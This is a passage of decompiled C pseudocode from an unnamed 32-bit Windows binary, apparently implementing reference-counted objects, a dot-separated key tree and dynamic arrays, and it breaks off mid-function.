//----- (1001773F) --------------------------------------------------------
int __thiscall sub_1001773F(int this)
{
  _DWORD *v2; // eax

  v2 = *(_DWORD **)(this + 16);
  if ( v2 )
    sub_100175D1(*(_DWORD **)(this + 20), v2);
  else
    sub_10017A74(*(_DWORD **)(this + 12), *(_DWORD *)(this + 20));
  sub_10016FB9(*(int **)(*(_DWORD *)(this + 12) + 48), *(_DWORD *)(*(_DWORD *)(this + 24) + 28));
  sub_10016FB9(*(int **)(*(_DWORD *)(this + 12) + 48), *(_DWORD *)(this + 36));
  return 1;
}

//----- (1001778D) --------------------------------------------------------
int *__cdecl sub_1001778D(int *a1, void *a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  unsigned int v4; // esi
  _DWORD *v5; // ebx
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  int v9; // [esp-10h] [ebp-74h]
  int v10; // [esp-Ch] [ebp-70h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-6Ch] BYREF
  volatile LONG *v12; // [esp-4h] [ebp-68h]
  int v13[5]; // [esp+Ch] [ebp-58h] BYREF
  int v14[2]; // [esp+20h] [ebp-44h] BYREF
  _DWORD v15[2]; // [esp+28h] [ebp-3Ch] BYREF
  int v16; // [esp+30h] [ebp-34h] BYREF
  volatile LONG *v17; // [esp+34h] [ebp-30h]
  volatile LONG *v18; // [esp+38h] [ebp-2Ch] BYREF
  volatile LONG *v19; // [esp+3Ch] [ebp-28h]
  void *v20[3]; // [esp+40h] [ebp-24h] BYREF
  void *v21; // [esp+4Ch] [ebp-18h]
  int v22; // [esp+50h] [ebp-14h]
  void *Block; // [esp+54h] [ebp-10h]
  int v24; // [esp+60h] [ebp-4h]

  v24 = 0;
  v22 = 0;
  sub_10016ACA((int)a2, &v18, 0x1Au);
  v24 = 1;
  Block = operator new(0x34u);
  LOBYTE(v24) = 2;
  if ( Block )
  {
    v12 = v19;
    v21 = &v11;
    v11 = v18;
    InterlockedIncrement(v19);
    LOBYTE(v24) = 2;
    v2 = sub_1001795F(Block, a2, (int)v11, v12);
  }
  else
  {
    v2 = 0;
  }
  LOBYTE(v24) = 1;
  sub_10050B91(a1, (int)v2);
  v22 = 1;
  sub_1000B36F((_DWORD *)v18 + 1, (int)v13);
  LOBYTE(v24) = 4;
  v3 = sub_1000B6F2(v13, 0);
  Block = 0;
  v4 = v3;
  while ( v4 )
  {
    sub_10016ACA((int)a2, &v16, v4);
    LOBYTE(v24) = 5;
    v21 = operator new(0x28u);
    LOBYTE(v24) = 6;
    if ( v21 )
    {
      v12 = (volatile LONG *)Block;
      v11 = v17;
      v20[2] = &v10;
      v10 = v16;
      InterlockedIncrement(v17);
      LOBYTE(v24) = 7;
      v9 = *a1;
      LOBYTE(v24) = 6;
      v5 = sub_10017325(v21, v9, v10, v11, (int)v12);
    }
    else
    {
      v5 = 0;
    }
    LOBYTE(v24) = 5;
    sub_10050B91(v20, (int)v5);
    LOBYTE(v24) = 8;
    v6 = sub_10020765((int)v20[0], v14);
    LOBYTE(v24) = 9;
    v7 = sub_10017A30(*a1, v15);
    LOBYTE(v24) = 10;
    sub_10018035((_DWORD *)*v7, (int)v6, (int *)v20, 0);
    LOBYTE(v24) = 9;
    sub_1000780D(v15);
    LOBYTE(v24) = 8;
    sub_1000D3AD(v14);
    ++*(_DWORD *)(*a1 + 24);
    if ( Block )
      sub_100175D1(v5, Block);
    else
      sub_10017A74((_DWORD *)*a1, (int)v5);
    v4 = *((_DWORD *)v20[0] + 8);
    Block = v5;
    LOBYTE(v24) = 5;
    sub_1002228F(v20);
    LOBYTE(v24) = 4;
    sub_10008301((void **)&v16);
  }
  LOBYTE(v24) = 1;
  sub_1000B3DF(v13);
  LOBYTE(v24) = 0;
  sub_10008301((void **)&v18);
  return a1;
}
// 1001778D: using guessed type int var_58[5];
// 1001778D: using guessed type _DWORD var_3C[2];

//----- (1001795F) --------------------------------------------------------
_DWORD *__stdcall sub_1001795F(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend)
{
  _DWORD *v4; // edi
  int v5; // edx
  volatile LONG *v6; // eax
  int v7; // ecx
  _DWORD *v9; // [esp-8h] [ebp-24h] BYREF
  int v10; // [esp-4h] [ebp-20h]
  void *v11; // [esp+Ch] [ebp-10h]
  int v12; // [esp+18h] [ebp-4h]
  _DWORD *Blocka; // [esp+28h] [ebp+Ch]

  v4 = 0;
  v12 = 0;
  *a1 = off_100FBF5C;
  v10 = (int)(a1 + 1);
  *a1 = &off_100FC07C;
  sub_100072D2((_DWORD *)v10);
  sub_10005BE1(0x10u, v5, (int)a1);
  v6 = lpAddend;
  v7 = a3;
  a1[6] = 0;
  v10 = (int)v6;
  a1[8] = v6;
  a1[7] = v7;
  InterlockedIncrement((volatile LONG *)v10);
  sub_10057D8D(a1 + 9);
  v10 = 52;
  a1[11] = 0;
  a1[12] = Block;
  Blocka = operator new(v10);
  LOBYTE(v12) = 7;
  if ( Blocka )
  {
    v9 = (_DWORD *)v10;
    v11 = &v9;
    sub_1000D372(&v9, (int)&unk_10186920);
    LOBYTE(v12) = 7;
    v4 = sub_10017C5F(Blocka, (int)a1, (int)v9, v10);
  }
  LOBYTE(v12) = 6;
  sub_10017C13(a1 + 9, (int)v4);
  v12 = -1;
  sub_10008301((void **)&a3);
  return a1;
}
// 10017996: variable 'v5' is possibly undefined
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC07C: using guessed type int (__thiscall *off_100FC07C)(void *Block, char);

//----- (10017A30) --------------------------------------------------------
_DWORD *__stdcall sub_10017A30(int a1, _DWORD *a2)
{
  volatile LONG *v2; // ecx

  v2 = *(volatile LONG **)(a1 + 40);
  a2[1] = v2;
  *a2 = *(_DWORD *)(a1 + 36);
  InterlockedIncrement(v2);
  return a2;
}

//----- (10017A74) --------------------------------------------------------
void __stdcall sub_10017A74(_DWORD *a1, int a2)
{
  int v2; // esi
  int v3; // eax
  int v4; // ecx
  volatile LONG *v5; // ecx
  int v6; // ecx
  int *v7; // ecx
  volatile LONG *v8; // [esp-8h] [ebp-40h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-3Ch]
  int *v10; // [esp+10h] [ebp-28h]
  LONG v11[6]; // [esp+14h] [ebp-24h] BYREF
  int v12; // [esp+34h] [ebp-4h]

  v2 = 0;
  a1[11] = a2;
  if ( a2 )
    *(_DWORD *)(a2 + 16) = 0;
  v3 = a1[11];
  if ( v3 )
    v2 = *(_DWORD *)(*(_DWORD *)(v3 + 24) + 28);
  sub_1000B36F((_DWORD *)(a1[7] + 4), (int)v11);
  v12 = 0;
  sub_1000B713(v4, v11, 0, v2);
  sub_1000B3BD(v11, a1[7] + 4);
  v9 = v5;
  v8 = v5;
  v9 = (volatile LONG *)a1[8];
  v6 = a1[7];
  v10 = (int *)&v8;
  v8 = (volatile LONG *)v6;
  InterlockedIncrement(v9);
  LOBYTE(v12) = 1;
  v7 = (int *)a1[12];
  LOBYTE(v12) = 0;
  sub_10016EF8(v7, (int)v8, v9);
  v12 = -1;
  sub_1000B3DF(v11);
}
// 10017AD0: variable 'v4' is possibly undefined
// 10017AE7: variable 'v5' is possibly undefined
// 10017A74: using guessed type LONG var_24[6];

//----- (10017B34) --------------------------------------------------------
int *__thiscall sub_10017B34(_DWORD *this, int *a2, int a3, void *a4)
{
  void *v5; // eax
  _DWORD *v6; // ecx
  void *v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v10; // [esp-10h] [ebp-38h] BYREF
  _DWORD *v11; // [esp-Ch] [ebp-34h]
  void *v12; // [esp-8h] [ebp-30h]
  _DWORD *v13; // [esp-4h] [ebp-2Ch]
  int v14; // [esp+0h] [ebp-28h] BYREF
  int v15; // [esp+Ch] [ebp-1Ch]
  int v16; // [esp+10h] [ebp-18h] BYREF
  void *Block; // [esp+14h] [ebp-14h]
  int *v18; // [esp+18h] [ebp-10h]
  int v19; // [esp+24h] [ebp-4h]
  _DWORD *v20; // [esp+38h] [ebp+10h]

  v18 = &v14;
  v19 = 0;
  v15 = 0;
  v5 = operator new(0x28u);
  v6 = v13;
  Block = v5;
  v19 = 1;
  if ( v5 )
  {
    v13 = (_DWORD *)this[11];
    v12 = a4;
    v11 = v6;
    v10 = v6;
    sub_1000D372(&v10, a3);
    LOBYTE(v19) = 1;
    v20 = sub_10017466(v7, Block, this, (int)v10, (int)v11, v12, v13);
  }
  else
  {
    v20 = 0;
  }
  LOBYTE(v19) = 0;
  sub_10050B91(a2, (int)v20);
  v15 = 1;
  v19 = 3;
  v8 = sub_10017A30((int)this, &v16);
  LOBYTE(v19) = 4;
  sub_10018035((_DWORD *)*v8, a3, a2, 0);
  LOBYTE(v19) = 3;
  sub_1000780D(&v16);
  v19 = 0;
  sub_10017A74(this, (int)v20);
  ++this[6];
  return a2;
}
// 10017B87: variable 'v7' is possibly undefined

//----- (10017C13) --------------------------------------------------------
_DWORD *__usercall sub_10017C13@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_100081D1((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
  return a1;
}

//----- (10017C5F) --------------------------------------------------------
_DWORD *__stdcall sub_10017C5F(_DWORD *a1, int a2, int a3, int a4)
{
  int v5; // [esp+0h] [ebp-1Ch] BYREF
  _DWORD *v6; // [esp+4h] [ebp-18h]
  void *v7; // [esp+Ch] [ebp-10h]
  int v8; // [esp+18h] [ebp-4h]

  v8 = 0;
  v7 = &v5;
  sub_1000D372(&v5, (int)&a3);
  LOBYTE(v8) = 0;
  sub_1002071F((int)a1, a2, v5, (int)v6);
  LOBYTE(v8) = 2;
  v6 = a1 + 4;
  *a1 = &off_10102964;
  sub_10018BFA(v6);
  v8 = -1;
  sub_1000D3AD(&a3);
  return a1;
}
// 10102964: using guessed type int (__stdcall *off_10102964)(char);

//----- (10017CC4) --------------------------------------------------------
int *__thiscall sub_10017CC4(int *this, char a2)
{
  sub_10018C67(this + 4);
  sub_100172FF(this);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (10017D0A) --------------------------------------------------------
_DWORD *__stdcall sub_10017D0A(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  _DWORD v6[2]; // [esp+8h] [ebp-20h] BYREF
  _DWORD v7[2]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+18h] [ebp-10h]
  int v9; // [esp+24h] [ebp-4h]

  v8 = 0;
  v9 = 1;
  sub_10057D8D(v6);
  LOBYTE(v9) = 2;
  v4 = sub_10017E09(a1, v7, (int)&a3, 2, 0);
  LOBYTE(v9) = 3;
  sub_10018F5A(v4, a2);
  v8 = 1;
  LOBYTE(v9) = 2;
  sub_1000780D(v7);
  LOBYTE(v9) = 1;
  sub_1000780D(v6);
  LOBYTE(v9) = 0;
  sub_1000D3AD(&a3);
  return a2;
}
// 10017D0A: using guessed type _DWORD var_20[2];
// 10017D0A: using guessed type _DWORD var_18[2];

//----- (10017D89) --------------------------------------------------------
_DWORD *__stdcall sub_10017D89(_DWORD *a1, _DWORD *a2, int a3, int a4)
{
  int *v4; // eax
  void *v6[2]; // [esp+Ch] [ebp-24h] BYREF
  _DWORD v7[2]; // [esp+14h] [ebp-1Ch] BYREF
  int v8; // [esp+1Ch] [ebp-14h]
  int v9; // [esp+2Ch] [ebp-4h]

  v8 = 0;
  v9 = 1;
  sub_10050B91(v6, 0);
  LOBYTE(v9) = 2;
  v4 = sub_10017E09(a1, v7, (int)&a3, 1, 0);
  LOBYTE(v9) = 3;
  sub_10018F27(v4, a2);
  v8 = 1;
  LOBYTE(v9) = 2;
  sub_1000780D(v7);
  LOBYTE(v9) = 1;
  sub_1002228F(v6);
  LOBYTE(v9) = 0;
  sub_1000D3AD(&a3);
  return a2;
}
// 10017D89: using guessed type _DWORD var_1C[2];

//----- (10017E09) --------------------------------------------------------
_DWORD *__thiscall sub_10017E09(_DWORD *this, _DWORD *a2, int a3, int a4, unsigned int a5)
{
  int v6; // ebx
  _DWORD *v7; // edi
  int *v8; // ecx
  int *v9; // eax
  int v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD v14[2]; // [esp+Ch] [ebp-30h] BYREF
  int v15[2]; // [esp+14h] [ebp-28h] BYREF
  _DWORD v16[2]; // [esp+1Ch] [ebp-20h] BYREF
  int v17; // [esp+24h] [ebp-18h] BYREF
  volatile LONG *v18; // [esp+28h] [ebp-14h]
  int v19; // [esp+2Ch] [ebp-10h]
  int v20; // [esp+38h] [ebp-4h]

  v6 = sub_1000DE8B(a5, a3, 0x2Eu);
  sub_100077CD(a2);
  v20 = 0;
  v19 = 1;
  if ( v6 == -1 )
  {
    sub_1000D372(&v17, a3);
    v20 = 1;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, &v17) )
    {
      v7 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(this[4] + 20))(this + 4, &v17);
      sub_1003098B(a2, v7);
    }
    LOBYTE(v20) = 0;
    v8 = &v17;
  }
  else
  {
    sub_1000D836(v6, a3, v16, 0);
    v20 = 2;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, _DWORD *))(this[4] + 8))(this + 4, v16) )
    {
      v9 = (int *)(*(int (__thiscall **)(_DWORD *, _DWORD *))(this[4] + 20))(this + 4, v16);
      v18 = (volatile LONG *)v9[1];
      v17 = *v9;
      v10 = v17;
      InterlockedIncrement(v18);
      LOBYTE(v20) = 3;
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10) == 2 )
      {
        sub_10057D8D(v14);
        LOBYTE(v20) = 4;
        sub_10018F5A(&v17, v15);
        LOBYTE(v20) = 6;
        sub_1000780D(v14);
        v11 = (_DWORD *)sub_10017E09(v14, a3, a4, v6 + 1);
        LOBYTE(v20) = 7;
        sub_1003098B(a2, v11);
        LOBYTE(v20) = 6;
        sub_1000780D(v14);
        LOBYTE(v20) = 3;
        sub_1000780D(v15);
      }
      LOBYTE(v20) = 2;
      sub_1000780D(&v17);
    }
    LOBYTE(v20) = 0;
    v8 = v16;
  }
  sub_1000D3AD(v8);
  if ( *a2 && a4 && (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 8))(*a2) != a4 )
  {
    v12 = sub_100077CD(v14);
    v20 = 8;
    sub_1003098B(a2, v12);
    LOBYTE(v20) = 0;
    sub_1000780D(v14);
  }
  return a2;
}
// 10017E09: using guessed type _DWORD var_20[2];
// 10017E09: using guessed type _DWORD var_30[2];

//----- (10017FA9) --------------------------------------------------------
bool __thiscall sub_10017FA9(_DWORD *this, int a2, int a3, int a4)
{
  _DWORD *v4; // eax
  _DWORD v6[2]; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-4h]
  bool v8; // [esp+1Fh] [ebp+Bh]

  v7 = 0;
  v4 = sub_10017E09(this, v6, (int)&a3, a2, 0);
  LOBYTE(v7) = 1;
  v8 = *v4 != 0;
  LOBYTE(v7) = 0;
  sub_1000780D(v6);
  v7 = -1;
  sub_1000D3AD(&a3);
  return v8;
}
// 10017FA9: using guessed type _DWORD var_14[2];

//----- (10017FFF) --------------------------------------------------------
int __thiscall sub_10017FFF(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[4] + 48))(this + 4, a2);
  return a2;
}

//----- (10018035) --------------------------------------------------------
void __thiscall sub_10018035(_DWORD *this, int a2, int *a3, unsigned int a4)
{
  int v5; // ecx
  _DWORD *v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // eax
  _DWORD *v10; // ebx
  _DWORD *v11; // eax
  _DWORD *v12; // edi
  _DWORD *v13; // eax
  int v14; // eax
  _DWORD *v15; // eax
  int v16; // [esp-Ch] [ebp-4Ch]
  int v17; // [esp-8h] [ebp-48h] BYREF
  int v18; // [esp-4h] [ebp-44h]
  void *Block; // [esp+Ch] [ebp-34h] BYREF
  volatile LONG *v20; // [esp+10h] [ebp-30h]
  int v21; // [esp+14h] [ebp-2Ch] BYREF
  void *v22[2]; // [esp+18h] [ebp-28h] BYREF
  int v23[2]; // [esp+20h] [ebp-20h] BYREF
  int v24[3]; // [esp+28h] [ebp-18h] BYREF
  int v25; // [esp+3Ch] [ebp-4h]

  v5 = sub_1000DE8B(a4, a2, 0x2Eu);
  v21 = v5;
  if ( v5 == -1 )
  {
    sub_1000D372(v24, a2);
    v25 = 0;
    v6 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v24) )
    {
      v7 = sub_1000E8EF(&v21);
      LOBYTE(v25) = 1;
      v18 = 81;
      goto LABEL_4;
    }
    sub_100077CD(v22);
    LOBYTE(v25) = 2;
    v8 = sub_10018F5A(a3, v23);
    LOBYTE(v25) = 3;
    v9 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v6 + 16))(v6, v24);
    sub_1003098B(v9, v8);
    LOBYTE(v25) = 2;
    sub_1000780D(v23);
    LOBYTE(v25) = 0;
    sub_1000780D(v22);
  }
  else
  {
    sub_1000D836(v5, a2, v24, 0);
    v25 = 4;
    sub_10057D8D(v23);
    LOBYTE(v25) = 5;
    v10 = this + 4;
    if ( (*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v24) )
    {
      v14 = (*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(this + 4, v24);
      v20 = *(volatile LONG **)(v14 + 4);
      Block = *(void **)v14;
      InterlockedIncrement(v20);
      LOBYTE(v25) = 10;
      if ( (*(int (__thiscall **)(void *))(*(_DWORD *)Block + 8))(Block) == 1 )
      {
        v7 = sub_1000E8EF(v22);
        LOBYTE(v25) = 11;
        v18 = 99;
LABEL_4:
        sub_100078FE((int)v7);
      }
      v15 = sub_10018F5A((int *)&Block, v22);
      LOBYTE(v25) = 12;
      sub_1003098B(v23, v15);
      LOBYTE(v25) = 10;
      sub_1000780D(v22);
    }
    else
    {
      Block = operator new(0x34u);
      LOBYTE(v25) = 6;
      if ( Block )
      {
        v17 = v18;
        v22[0] = &v17;
        sub_1000D372(&v17, (int)v24);
        LOBYTE(v25) = 7;
        v16 = this[3];
        LOBYTE(v25) = 6;
        v11 = sub_10017C5F(Block, v16, v17, v18);
      }
      else
      {
        v11 = 0;
      }
      LOBYTE(v25) = 5;
      sub_10017C13(v23, (int)v11);
      sub_100077CD(&Block);
      LOBYTE(v25) = 8;
      v12 = sub_10018F5A(v23, v22);
      LOBYTE(v25) = 9;
      v13 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v10 + 16))(v10, v24);
      sub_1003098B(v13, v12);
      LOBYTE(v25) = 8;
      sub_1000780D(v22);
    }
    LOBYTE(v25) = 5;
    sub_1000780D(&Block);
    sub_10018035(a2, a3, v21 + 1);
    LOBYTE(v25) = 4;
    sub_1000780D(v23);
  }
  v25 = -1;
  sub_1000D3AD(v24);
}
// 10018035: using guessed type int var_18[3];

//----- (10018293) --------------------------------------------------------
int __thiscall sub_10018293(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ebx
  unsigned int i; // edi
  _DWORD *v4; // eax
  int v6; // [esp+10h] [ebp-20h] BYREF
  unsigned int v7; // [esp+14h] [ebp-1Ch]
  int v8; // [esp+2Ch] [ebp-4h]

  v1 = this + 4;
  v2 = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(this[4] + 52))(this + 4, &v6);
  v8 = 0;
  for ( i = 0; i < v7; ++i )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v6 + 44))(&v6, i);
    v2 += (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v4 + 4))(*v4);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 28))(v1);
  v8 = -1;
  sub_1001878F(&v6);
  return v2;
}

//----- (10018316) --------------------------------------------------------
int __thiscall sub_10018316(_DWORD *this, int a2, unsigned int a3)
{
  int v4; // ebx
  _DWORD *v5; // esi
  _DWORD *v7; // eax
  int v8; // ebx
  _DWORD *v9; // edi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int *v12; // eax
  _DWORD v13[2]; // [esp+10h] [ebp-28h] BYREF
  int v14[2]; // [esp+18h] [ebp-20h] BYREF
  int v15[3]; // [esp+20h] [ebp-18h] BYREF
  int v16; // [esp+34h] [ebp-4h]

  v4 = sub_1000DE8B(a3, a2, 0x2Eu);
  if ( v4 == -1 )
  {
    sub_1000D372(v14, a2);
    v16 = 0;
    v5 = this + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(this[4] + 8))(this + 4, v14) )
    {
LABEL_3:
      v16 = -1;
      sub_1000D3AD(v14);
      return 0;
    }
    v7 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v5 + 16))(this + 4, v14);
    v8 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v7 + 4))(*v7);
    (*(void (__thiscall **)(_DWORD *, int *))(*v5 + 12))(this + 4, v14);
  }
  else
  {
    sub_1000D836(v4, a2, v14, 0);
    v16 = 1;
    v9 = this + 4;
    if ( !(*(unsigned __int8 (__thiscall **)(_DWORD *, int *))(*v9 + 8))(v9, v14) )
      goto LABEL_3;
    v10 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(v9, v14);
    if ( (*(int (__thiscall **)(_DWORD))(*(_DWORD *)*v10 + 8))(*v10) != 2 )
    {
      v11 = sub_1000E8EF(v13);
      LOBYTE(v16) = 2;
      sub_100078FE((int)v11);
    }
    sub_10057D8D(v13);
    LOBYTE(v16) = 3;
    v12 = (int *)(*(int (__thiscall **)(_DWORD *, int *))(*v9 + 16))(v9, v14);
    sub_10018F5A(v12, v15);
    LOBYTE(v16) = 5;
    sub_1000780D(v13);
    v8 = sub_10018316(a2, v4 + 1);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)(v15[0] + 16) + 32))(v15[0] + 16) )
      (*(void (__thiscall **)(_DWORD *, int *))(*v9 + 12))(v9, v14);
    LOBYTE(v16) = 1;
    sub_1000780D(v15);
  }
  v16 = -1;
  sub_1000D3AD(v14);
  return v8;
}
// 10018316: using guessed type _DWORD var_28[2];

//----- (10018494) --------------------------------------------------------
int sub_10018494()
{
  return 2;
}

//----- (10018498) --------------------------------------------------------
int __thiscall sub_10018498(int this, int a2)
{
  sub_100185CD((void *)(this + 4), a2);
  return a2;
}

//----- (100184CE) --------------------------------------------------------
_DWORD *__thiscall sub_100184CE(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x20u);
  if ( v3 )
    v4 = sub_10018600(v3, (int)this);
  else
    v4 = 0;
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}

//----- (10018549) --------------------------------------------------------
_DWORD *__thiscall sub_10018549(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax

  v3 = operator new(0xCu);
  if ( v3 )
  {
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_101023F8;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 101023F8: using guessed type int (__thiscall *off_101023F8)(void *Block, char);

//----- (100185A9) --------------------------------------------------------
void *__thiscall sub_100185A9(_DWORD *this)
{
  void *result; // eax

  result = &loc_100A0EDD;
  *this = off_100FBF5C;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (100185CD) --------------------------------------------------------
int __thiscall sub_100185CD(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (10018600) --------------------------------------------------------
_DWORD *__stdcall sub_10018600(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = &off_10102A0C;
  a1[2] = off_101029AC;
  sub_1000D17D(a1 + 3, (wchar_t *)&word_10102960);
  sub_100077CD(a1 + 5);
  a1[7] = 0;
  return a1;
}
// 101029AC: using guessed type int (__thiscall *off_101029AC[2])(void *Block, char);
// 10102A0C: using guessed type int (__stdcall *off_10102A0C)(char);

//----- (10018662) --------------------------------------------------------
BOOL __thiscall sub_10018662(int this)
{
  return *(_DWORD *)(this + 28) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10018675) --------------------------------------------------------
LONG *__thiscall sub_10018675(LONG *this)
{
  int v2; // eax
  _DWORD *v3; // eax

  v2 = (*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[7]);
  sub_10001236((LONG *)(v2 + 4), this + 4);
  v3 = (_DWORD *)(*(int (__thiscall **)(int, LONG))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, this[7]);
  sub_1003098B(this + 5, v3);
  return this + 2;
}

//----- (100186B0) --------------------------------------------------------
void __thiscall sub_100186B0(_DWORD *this)
{
  --this[7];
}

//----- (100186B4) --------------------------------------------------------
void __thiscall sub_100186B4(int *this)
{
  *this = (int)off_101029AC;
  sub_1000780D(this + 3);
  sub_1000D3AD(this + 1);
}
// 101029AC: using guessed type int (__thiscall *off_101029AC[2])(void *Block, char);

//----- (100186F0) --------------------------------------------------------
int *__thiscall sub_100186F0(int *this, char a2)
{
  sub_100186B4(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (1001872B) --------------------------------------------------------
int *__thiscall sub_1001872B(int *Block, char a2)
{
  sub_100186B4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001874A) --------------------------------------------------------
int *__thiscall sub_1001874A(int *this, int *a2)
{
  char *v3; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (char *)this[3];
    if ( v3 )
      sub_10007F50(v3);
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1001878F) --------------------------------------------------------
void *__thiscall sub_1001878F(_DWORD *this)
{
  char *v2; // eax
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_101029B0;
  v5 = 1;
  v2 = (char *)this[3];
  if ( v2 )
    sub_10007F50(v2);
  this[3] = 0;
  v5 = -1;
  return sub_100185A9(this);
}
// 101029B0: using guessed type int (__thiscall *off_101029B0)(void *Block, char);

//----- (100187F0) --------------------------------------------------------
int __thiscall sub_100187F0(_DWORD *this)
{
  return this[1];
}

//----- (100187F4) --------------------------------------------------------
void __thiscall sub_100187F4(_DWORD *this, int *a2, unsigned int a3)
{
  int v4; // edi
  int v5; // eax
  unsigned int i; // ebx
  int v7; // eax
  int v8; // [esp+Ch] [ebp-14h] BYREF
  volatile LONG *v9; // [esp+10h] [ebp-10h]
  int v10; // [esp+1Ch] [ebp-4h]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013EA0F);
  v9 = (volatile LONG *)a2[1];
  v8 = *a2;
  InterlockedIncrement(v9);
  v10 = 0;
  v4 = *this;
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v4 + 60))(this, v5 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ; --i )
  {
    v7 = this[3];
    if ( i <= a3 )
      break;
    sub_1003098B((_DWORD *)(v7 + 8 * i), (_DWORD *)(v7 + 8 * i - 8));
  }
  sub_1003098B((_DWORD *)(v7 + 8 * a3), &v8);
  ++this[1];
  v10 = -1;
  sub_1000780D(&v8);
}

//----- (10018891) --------------------------------------------------------
int __thiscall sub_10018891(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // eax

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013EADA);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    sub_1003098B((_DWORD *)(this[3] + 8 * v2), (_DWORD *)(this[3] + 8 * v2 + 8));
    ++v2;
  }
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1003098B((_DWORD *)(this[3] + 8 * v4), dword_10193B84);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}
// 10193B84: using guessed type _DWORD dword_10193B84[2];

//----- (100188EB) --------------------------------------------------------
int __thiscall sub_100188EB(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013EADB);
  return this[3] + 8 * a2;
}

//----- (1001890C) --------------------------------------------------------
int __thiscall sub_1001890C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013EB1A);
  return this[3] + 8 * a2;
}

//----- (1001892D) --------------------------------------------------------
char *__thiscall sub_1001892D(_DWORD *this, char *a2)
{
